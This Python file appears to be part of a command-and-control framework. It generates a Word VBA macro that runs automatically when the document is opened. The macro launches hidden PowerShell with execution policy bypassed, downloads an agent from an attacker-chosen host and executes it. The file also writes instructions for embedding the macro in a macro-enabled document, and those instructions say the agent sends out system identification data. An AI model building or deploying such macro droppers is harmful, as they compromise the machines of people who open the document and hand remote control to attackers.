# core/helpers/office_agents.py
import os
import json

def generate_word_macro_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Get the key information
    keys_file = os.path.join(campaign_folder, "keys.json")
    key_info = "Key used from campaign configuration"
    
    if os.path.exists(keys_file):
        try:
            with open(keys_file, 'r') as f:
                keys_data = json.load(f)
            key_info = f"Encryption key from: {keys_file}"
        except Exception as e:
            key_info = f"Warning: Error reading keys file: {e}"
    else:
        key_info = f"Warning: Keys file not found. The agent will use the key from the server."
    
    http = "https" if ssl else "http"
    raw_agent = "/raw_agent"
    
    # Generate a VBA macro for Word with identity collection
    macro_code = f"""
    Sub AutoOpen()
        ' Auto-execute when the document is opened
        ExecuteAgent
    End Sub

    Sub Document_Open()
        ' Auto-execute when the document is opened (alternative method)
        ExecuteAgent
    End Sub

    Sub ExecuteAgent()
        ' Execute the agent via PowerShell with identity collection
        
        ' Hide PowerShell window
        Dim windowStyle As Integer
        windowStyle = 0 ' Hidden window
        
        ' Create the PowerShell command with identity collection
        Dim command As String
        command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""&{{IEX(New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{raw_agent}')}}"" "
        
        ' Execute the command
        Dim result As Integer
        result = Shell(command, windowStyle)
    End Sub
    """
    
    # Save the macro to a file
    macro_file_path = os.path.join(agents_folder, "Word_macro.vba")
    with open(macro_file_path, "w") as f:
        f.write(macro_code)
    
    # Create instructions for using the macro
    instructions = f"""
    Word Macro Agent Instructions:
    
    1. Open Microsoft Word
    2. Press Alt+F11 to open the VBA editor
    3. Right-click on "ThisDocument" in the Project Explorer
    4. Select "Insert" > "Module"
    5. Paste the following code into the module:
    
    {macro_code}
    
    6. Save the document as a macro-enabled document (.docm)
    7. When the document is opened, it will connect to: {http}://{host}:{port}{raw_agent}
    8. The agent will use encryption with campaign: {campaign_name}
    9. {key_info}
    10. The agent will collect and send system identification information for client verification
    """
    
    instruction_file_path = os.path.join(agents_folder, "Word_macro_instructions.txt")
    with open(instruction_file_path, "w") as f:
        f.write(instructions)
    
    result = f"Word Macro agent generated and saved to {macro_file_path}\nInstructions saved to {instruction_file_path}"
    return result